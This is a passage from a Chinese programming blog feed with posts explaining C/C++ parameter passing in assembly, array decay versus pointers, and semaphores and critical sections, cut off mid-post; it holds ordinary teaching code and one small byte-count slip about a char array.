src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/03.png" alt="03"></p><p>可以发现后面的参数比前面的参数先进入内存中，所以有时候发现函数参数中的内存地不规律的不用感到奇怪。但是函数内定义的局部变量内存地址肯定是递减的。</p><p>然后就是函数返回简单结果</p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/04.png" alt="04"></p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/05.png" alt="05"></p><p>同函数传参一样，也是用寄存器充当中间人，将数据从一块内存区域移到另一块内存区域。不过返回结果一般用<code>eax</code>寄存器</p><p>以上都是基本数据类型的函数传参与函数返回结果，接下来看一下复杂类型的比如类。</p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/06.png" alt="06"></p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/07.png" alt="07"></p><p>由于是复杂数据类型，所以编译器采用了参数过多时的传参方式，这里是隐式调用构造函数，在正式调用函数前先调用构造函数，将对象在在内存中先构造出来，然后直接在函数中使用这块内存。注意到，在调用类的函数前，都会有个<code>lea rax, [n]</code>，<code>mov rdi, rax</code>的操作，如果猜的不差，<code>[n]</code>这个内存单元就是对象的首个元素，那么这一通操作就是在<code>rdi</code>存放该对象的地址，以<code>rid</code>作为中间人，到时候赋值给<code>this</code>指针用的，在类函数中<code>this</code>指针也有专属的空间，这个例子里<code>[rbp-8]</code>就是<code>this</code>了。</p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/08.png" alt="08"></p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/09.png" alt="09"></p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/10.png" alt="10"></p><p>大致意思就是会在内存中用<code>e</code>拷贝构造函数构造出一个<code>tmp</code>，销毁<code>e</code>，然后赋值给<code>e1</code>，最后把<code>tmp</code>销毁。</p><p>对于类这样的复杂类型的函数传参和结果返回，编译器的做法就是在正式调用函数前先将参数和返回结果的内存分配出来，然后将它们的内存地址放到比如<code>rsi</code>和<code>rdi</code>中传到函数中，对它们做相应的操作。</p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/%E7%AE%80%E5%8D%95%E7%B1%BB%E5%9E%8B%E7%9A%84%E4%BC%A0%E5%8F%82%E5%92%8C%E8%BF%94%E5%9B%9E.png"></p><p><img src="/../posts_img/%E4%BB%8E%E6%B1%87%E7%BC%96%E7%9A%84%E8%A7%92%E5%BA%A6%E7%90%86%E8%A7%A3C++%E7%9A%84%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E4%B8%8E%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E/%E7%B1%BB%E7%9A%84%E4%BC%A0%E5%8F%82%E5%92%8C%E8%BF%94%E5%9B%9E.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C和C++中的数组是什么</title>
      <link href="/2024/04/01/C%E5%92%8CC++%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E6%98%AF%E4%BB%80%E4%B9%88/"/>
      <url>/2024/04/01/C%E5%92%8CC++%E4%B8%AD%E7%9A%84%E6%95%B0%E7%BB%84%E6%98%AF%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<p>这篇文章主要是为了记录一下自己的想法（<del>意淫</del>，可以直接看下面两个链接，大佬总结的很精炼</p><p><a href="https://stackoverflow.com/questions/24467726/what-exactly-is-the-array-name-in-c">What exactly is the array name in c? - Stack Overflow</a></p><p><a href="https://stackoverflow.com/questions/1641957/is-an-array-name-a-pointer">c - Is an array name a pointer? - Stack Overflow</a></p><p>当我们初学<code>C语言</code>的时候，老师可能会说：数组就是指针，可以拿来当指针用。然后就不了了之了。但凡是一个会上网的人都会在网上得到一个答案：数组是数组，指针是指针。然后就懵了，到底哪个是正确的？今天就来聊聊吧。</p><p>在理解数组前，先了解一下如何定义变量。或许你会说这很简单，<code>数据类型 变量名</code>就搞定了，像这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x;</span><br></pre></td></tr></table></figure><p>就成功定义一个整形变量<code>x</code>，这当然是没错的。但是在C&#x2F;C++的语法中还有更深层次的解释。</p><p>在**《C++ Primer》中文版第5版** 第45页给出：<u>一条声明语句由一个**基本数据类型（base type）<strong>和紧随其后的一个</strong>声明符（declarator）**列表组成。</u></p><blockquote><p>补充：每个声明符命名了一个变量并指定该变量为基本数据类型有关的某种类型</p></blockquote><p>其中，基本数据类型我们很熟悉，比如：<code>char</code>、<code>short</code>、<code>int</code>、<code>float</code>这些，但是声明符是什么？直接这么看不好理解，举一些具体的例子吧</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x, *p1, *p2;</span><br></pre></td></tr></table></figure><p>在这条声明语句中我定义了三个变量，一个基本数据类型<code>int</code>和三个声明符<code>x</code>、<code>*p1</code>、<code>*p2</code>，其中<code>x</code>、<code>p1</code>、<code>p2</code>是各自变量的变量名。别看走眼了。我再举一个更明显的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> (*p)(<span class="type">char</span>);</span><br></pre></td></tr></table></figure><p>这里我定义了一个函数指针，这个被指向的函数接受一个<code>char</code>参数，最后返回一个<code>int</code>变量。在这个声明中，声明符就是<code>(*p)(char)</code>其中 p 是变量名。这个声明符中表明了该变量的变量名，以及该变量与基本数据类型的某种关系。应该有点感觉了吧</p><p>下面再来说说数组是什么。</p><p>在**《C++ Primer》中文版第5版** 第101页给出定义：<u>数组是一种<strong>复合类型</strong></u>。<strong>复合类型</strong>是什么？跟上面解释变量定义在同一页：<u><strong>复合类型（compound type）<strong>是指基于其他类型定义的类型</u>。讲的有些虚。结合上面的例子来看。一个变量声明的</strong>声明符</strong>可以很简单，也可以很复杂。简单的比如变量<code>x</code>，它的声明符就只有一个变量名，于是这个名为<code>x</code>的变量理所当然的就是<code>int</code>类型的变量。但是像指针变量<code>p1</code>和<code>p2</code>，它们的声明符不仅由变量名组成还有关键符号。这些关键符号使得它们成为了基于<code>int</code>类型定义的一种复合类型，被称为指针类型。</p><p>像这样定义一个数组：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>];</span><br></pre></td></tr></table></figure><p>是不是更清晰了呢，这句变量声明中基本数据类型为<code>int</code>，声明符为<code>a[5]</code>其中<code>a</code>为变量名，<code>[5]</code>解释了这个变量内含5个元素，是一个数组。总结来说，<code>a</code>是一个有包含5个<code>int</code>类型的数组变量。</p><p>说了这么多，只是想说明数组就是一种基于基本数据类型而定义的一种复合类型，在C&#x2F;C++中这种复合类型被称为数组。它同指针或者C++中的引用一样，都是复合类型。他们之间的关系是平行的，没有谁是谁一说。</p><p>但是为什么说数组可以当作指针来用呢？这句话从结果上来说是正确的。我们来分析一下其中的原理</p><p>我们先定义一个变量，并给这个变量复制赋值为0x55AA，这很简单，那么这个过程在底层到底发生了什么呢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x;</span><br><span class="line">x = <span class="number">0x55AA</span>;</span><br></pre></td></tr></table></figure><p>我们声明一个变量的本质是什么，其实就是开辟一块空间，然后利用这块空间。如何表示这块空间呢，在这个例子中，就是用这个变量的变量名去表示这块空间。假设这个变量的地址为<code>100</code>，那么这个变量的内存分布如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x</span><br><span class="line">+----+------+-----+-----+</span><br><span class="line">| AA |  55  |  00 |  00 |</span><br><span class="line">+----+------+-----+-----+</span><br><span class="line">  100   101   102   103   </span><br></pre></td></tr></table></figure><p>从我们人的角度来看，给x赋值只是简单的给变量赋值，但是从编译器的角度来看我们对x的操作就是对用x表示的那块空间的操作。从汇编语言出发或许会更明显，下面是上面的代码编译为汇编的样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">mov     DWORD PTR [rbp-4], 0x55AA</span><br><span class="line">mov     eax, 0</span><br><span class="line">pop     rbp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>在这段代码中，<code>rbp-4</code>就是x表示的空间的起始地址。但是这个地址表示的一个字节是装不下0x55AA的，所以编译器采用了双字（DWORD PTR）在以<code>rbp-4</code>为起始地址的连续4个字节的空间装填0x55AA，但是编译器是怎么知道用双字的呢，我们在定义<code>x</code>为<code>int</code>不是已经给出了答案吗</p><p>所以我们对<code>int x</code>应该有更清晰的认知，在C代码中，或者说从人的角度看是<code>x</code>一个变量的变量名，我们用变量名去表示这个变量，但是从编译器的角度来看，<code>x</code>表示的是一块连续的内存空间，这个空间有多大呢，4个字节</p><p>同样的，这样的一个想法可以用来解释数组变量，我们定义一个数组C</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> a[<span class="number">10</span>];</span><br></pre></td></tr></table></figure><p>就是在内存中开辟连续8个字节的空间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   +---+</span><br><span class="line">a: |   | a[0]</span><br><span class="line">   +---+ </span><br><span class="line">   |   | a[1]</span><br><span class="line">   +---+</span><br><span class="line">   |   | a[2]</span><br><span class="line">   +---+</span><br><span class="line">    ...</span><br><span class="line">   +---+</span><br><span class="line">   |   | a[9]</span><br><span class="line">   +---+</span><br></pre></td></tr></table></figure><p>用变量名<code>a</code>表示这连续的空间，这个连续的空间有多大呢，编译器可以通过<code>char</code>和<code>[10]</code>计算出来，8个字节，这也能够解释为什么<code>sizeof a</code>会等于 10</p><p>然后我们就可以通过变量名<code>a</code>去使用这块空间，但问题是怎么用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x</span><br><span class="line">x = <span class="number">2</span>;</span><br><span class="line"><span class="type">int</span> y = x + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>像<code>x</code>这样的整形变量，编译器将其作为右值来使用时操作的就是<code>x</code>这块空间里的数据。但是像<code>a</code>这样的数组类型呢，编译器会直接使用这块连续空间里的数据吗，好像不能吧，这也不像回事。但是C语言的设计者就一定要它当上右值去使用，怎么办呢？这就提出来了**降级（decay）**的概念。</p><p>所谓降级，就是当数组被用作右值时，会变成一个指针，这个指针指向该数组的第一个元素。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">3</span>];</span><br><span class="line">*a = <span class="number">5</span>;</span><br></pre></td></tr></table></figure><p>在这个例子中，先说结论，就是<code>a[0]</code>被赋值为了5。等号左边<code>*a</code>作为一个表达式，表达式的结果不是左值就是右值，很明显这个表达式的结果是一个左值，也就是<code>a[0]</code>。而数组变量<code>a</code>在这个表达式中作为右值使用就被降级为一个指针，这个指针指向数组a的首个元素，指针类型就是<code>int*</code>。</p><p>这一点在<strong>Visual Studio 2022</strong>中写下面这样的代码可以验证</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">auto</span> p = a;</span><br></pre></td></tr></table></figure><p>然后把光标放在<code>p</code>上，它就会给出<code>p</code>的数据类型，即<code>int *p</code></p><p>有了<strong>降级</strong>这个概念就可以谈谈<code>[]</code>，也就是下标运算符</p><p>初学时，我们会先入为主的认为这个操作符只有数组才能用，但是又会发现指针也能用这个操作符，像这样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span>* p = a; <span class="comment">// a 降级为int*指针，指向a数组的首个元素</span></span><br><span class="line">p[<span class="number">2</span>] = <span class="number">3</span>;</span><br></pre></td></tr></table></figure><p>这个时候书上会说，<code>p[2]</code>等价于<code>*(p + 2)</code>，理是这么个理，但为什么指针还是可以用这个操作符。我们不妨换个思路，这个操作符的操作对象其实就是指针。也就是说，这个操作符并不应该给数组类型用的，但是为什么又可以呢？因为降级呀。由于这个操作符的操作对象是指针，但是数组变量在作为右值使用时可以被降级为指针，一个指向数组首个元素的指针，所以像<code>a[i]</code>这样的操作才能说的通。其实在我看来，像<code>*(p + i)</code>这样的操作太繁琐而且不易于阅读，所以设计者设计出<code>p[i]</code>这样的操作符来简化写法，而且易于阅读。</p><p>然后再谈谈取址运算符<code>&amp;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="type">int</span>* p = &amp;x;</span><br></pre></td></tr></table></figure><p>这个我们很熟悉，取地址嘛。但又没有想过为什么<code>a == &amp;a</code>为什么结果为 true 呢</p><p>在上面讲过，<code>int x</code>变量就表示了4个字节的连续空间，取址，取这片空间的地址，但是表示这片连续空间的地址用什么表示呢？很自然的应该就是空间的起始地址了，比如说上面的<code>rbp-4</code>就是变量<code>x</code>的起始地址。同理啊，数组变量<code>a</code>表示的是比如20个字节的地址空间，那么<code>&amp;a</code>就是取这片空间的地址，也就是这片空间的起始地址了，很凑巧这也正好是数组首个元素的地址。前面也说了，因为等式左边的<code>a</code>作为右值被降级为指向首个元素的指针。所以这个表达式结果为 true 也就不奇怪了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">   +---+</span><br><span class="line">a: |   | a[0]   &lt;-- &amp;a</span><br><span class="line">   +---+ </span><br><span class="line">   |   | a[1]</span><br><span class="line">   +---+</span><br><span class="line">   |   | a[2]</span><br><span class="line">   +---+</span><br><span class="line">    ...</span><br><span class="line">   +---+</span><br><span class="line">   |   | a[4]</span><br><span class="line">   +---+</span><br></pre></td></tr></table></figure><p>要补充的是，<code>&amp;a</code>表达式结果的数据类型是数组指针，是一个指向数组的指针，这与表达式<code>a</code>结果的数据类型是<code>int*</code>不同。由于只比较了数据的值没有比较类型，所以才得到了 true。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">auto</span> p = &amp;a; <span class="comment">// int (*p)[5]</span></span><br></pre></td></tr></table></figure><p>是这个样子的。</p><p>所以有些想当然的表达式是不被允许的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">5</span>];</span><br><span class="line"><span class="type">int</span>* p = &amp;a; <span class="comment">// error: &quot;int (*)[5]&quot;类型的值不能用于初始化&quot;int *&quot;类型的实体</span></span><br><span class="line"><span class="type">int</span> (*p)[<span class="number">5</span>] = &amp;a; <span class="comment">// 正确</span></span><br><span class="line"><span class="type">int</span>* p = a; <span class="comment">// 正确</span></span><br></pre></td></tr></table></figure><p>最后再来说说数组作为函数参数的情况吧。</p><p>有时候我们会发现下面这种函数定义的情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> b[<span class="number">1</span>])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> b[<span class="number">2</span>])</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> b[<span class="number">3</span>])</span>;</span><br><span class="line"><span class="comment">//甚至是</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> b[])</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>];</span><br><span class="line">    f(a); <span class="comment">// 以上几个函数都可以用这个来调用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么可以这样呢，似乎变量的数据类型都给不太一样，而且从语法上来说并不支持<code>int b[] = a</code>这样的赋值。这里又涉及到了<strong>降级</strong>。经过编译器处理后，它们统统都变成了<code>void f(int* b)</code>，这样<code>int* b = a</code>，a降级为<code>int*</code>指针，又变得合理了起来。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">f1</span><span class="params">(<span class="type">int</span>* a)</span></span><br><span class="line">&#123;</span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">f2</span><span class="params">(<span class="type">int</span> a[])</span></span><br><span class="line">&#123;</span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a[<span class="number">5</span>];</span><br><span class="line">    f1(a);</span><br><span class="line">    f2(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">f1(int*):</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        mov     QWORD PTR [rbp-8], rdi</span><br><span class="line">        mov     rax, QWORD PTR [rbp-8]</span><br><span class="line">        mov     DWORD PTR [rax], 0</span><br><span class="line">        nop</span><br><span class="line">        pop     rbp</span><br><span class="line">        ret</span><br><span class="line">f2(int*):</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        mov     QWORD PTR [rbp-8], rdi</span><br><span class="line">        mov     rax, QWORD PTR [rbp-8]</span><br><span class="line">        mov     DWORD PTR [rax], 0</span><br><span class="line">        nop</span><br><span class="line">        pop     rbp</span><br><span class="line">        ret</span><br><span class="line">main:</span><br><span class="line">        push    rbp</span><br><span class="line">        mov     rbp, rsp</span><br><span class="line">        sub     rsp, 32</span><br><span class="line">        lea     rax, [rbp-32]</span><br><span class="line">        mov     rdi, rax</span><br><span class="line">        call    f1(int*)</span><br><span class="line">        lea     rax, [rbp-32]</span><br><span class="line">        mov     rdi, rax</span><br><span class="line">        call    f2(int*)</span><br><span class="line">        mov     eax, 0</span><br><span class="line">        leave</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure><p>从C代码到汇编的变化是这样的，可以发现它们的参数都变成一样的了。在C++中，甚至连<code>void f(int* a)</code>和<code>void f(int a[])</code>的函数重载都做不到，因为它们在编译后都是一样的。</p><p>为什么要这样做呢，首先从语法上并不允许数组之间的直接赋值；其次在传参数是需要拷贝的，因为调用一个函数而拷贝一个数组这样的资源开销是很大且不值的，还不如用一个指针作为参数来接收，能正确用上数组的情况下还能避免不必要的开销。</p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【哈工大操作系统】信号量和临界区</title>
      <link href="/2024/03/31/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91%E4%BF%A1%E5%8F%B7%E9%87%8F%E5%92%8C%E4%B8%B4%E7%95%8C%E5%8C%BA/"/>
      <url>/2024/03/31/%E3%80%90%E5%93%88%E5%B7%A5%E5%A4%A7%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E3%80%91%E4%BF%A1%E5%8F%B7%E9%87%8F%E5%92%8C%E4%B8%B4%E7%95%8C%E5%8C%BA/</url>
      
        <content type="html"><![CDATA[<p><strong>信号量</strong>: 一块资源 对于某种进程 所能容忍的 对该资源进行<strong>操作</strong>的 <strong>次数</strong>。</p><p>所谓操作，涵盖了<strong>生产</strong>和<strong>消费</strong>。</p><p>不是说<code>生产者</code>进程生产了，就是信号量要加 1 。相反，它需要减 1 。因为生产者进程对这块资源的生产就是对这块资源的操作，既然是操作，那么相应的，这类进程对这块资源的的信号量就要减 1。</p><p>虽然<code>生产者</code>进程的信号量变化不那么直观，但是<code>消费者</code>进程的信号量的变化还是很直观的。消费者消费了，就是对这块资源的一个申请，信号量就要减 1 。不消费了，就是一次释放，信号量自然要加 1 。</p><p>信号量(semaphore)，有两个著名操作，<strong>PV操作</strong>，这两个单词是荷兰语，就不深究为什么是P和V了。但是需要记得的是，<strong>P操作</strong>是申请资源，<strong>V操作</strong>是释放资源。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> count; <span class="comment">// 记录资源个数</span></span><br><span class="line">    PCB* <span class="built_in">queue</span>; <span class="comment">// 记录等待在该信号量上的进程</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 上面对信号量的解释其实是对count的解释，真正的信号量还应当包含一个队列，用来记录等待进程</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">P</span><span class="params">(<span class="keyword">struct</span> semaphore sem)</span> &#123;</span><br><span class="line">    sem.count--; <span class="comment">// 先申请再做下一步打算</span></span><br><span class="line">    <span class="keyword">if</span> (sem.count &lt; <span class="number">0</span>) &#123; <span class="comment">// 先减再判断</span></span><br><span class="line">        <span class="comment">/* place this process in sem.queue */</span></span><br><span class="line">        <span class="comment">/* block this process */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">V</span><span class="params">(<span class="keyword">struct</span> semphore sem)</span> &#123;</span><br><span class="line">    sem.count++; <span class="comment">// 先释放再做下一步打算</span></span><br><span class="line">    <span class="keyword">if</span> (sem.count &lt;= <span class="number">0</span>) &#123; <span class="comment">// 先加再判断</span></span><br><span class="line">        <span class="comment">/* remove the front process from sem.queue */</span></span><br><span class="line">        <span class="comment">/* place the process on ready list */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用信号量可以实现判断是否要让一个进程睡眠还是唤醒，实现进程之间的同步。于是，信号量的<code>count</code>一定要正确，一定要对应上其队列中的个数。考虑下面一种情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">P</span><span class="params">(<span class="keyword">struct</span> semaphore sem)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 将count--分解为</span></span><br><span class="line">    <span class="keyword">register</span> = count;</span><br><span class="line">    <span class="keyword">register</span>--;</span><br><span class="line">    count = <span class="keyword">register</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个进程，可能会有如下的调度顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">P1.register = count; // count == n</span><br><span class="line">P1.register--;</span><br><span class="line">P2.register = count; // count == n</span><br><span class="line">P2.register--;</span><br><span class="line">count = P1.register;</span><br><span class="line">count = P2.register;</span><br></pre></td></tr></table></figure><p>本来，<code>count</code>是要等于<code>n-2</code>，但是现在<code>count</code>等于<code>n-1</code>，于是错误就产生了。这是由于系统的进程调度机制导致的。</p><p>所以引出了<strong>临界区</strong>的概念，对信号量加上一层保护。</p><p><strong>临界区</strong>：对于同一段代码，一次只允许一个进程进入。比如上面要修改信号量的值，一次应该只允许一个进程执行，所以将这段代码划为一个临界区。</p><p>为了实现对实现临界区的保护，还需要些两段代码：<code>进入区</code>和<code>退出区</code>。</p><p>下面要讲述的就是如何实现进入区和退出区。</p><h3 id="临界区代码的保护原则："><a href="#临界区代码的保护原则：" class="headerlink" 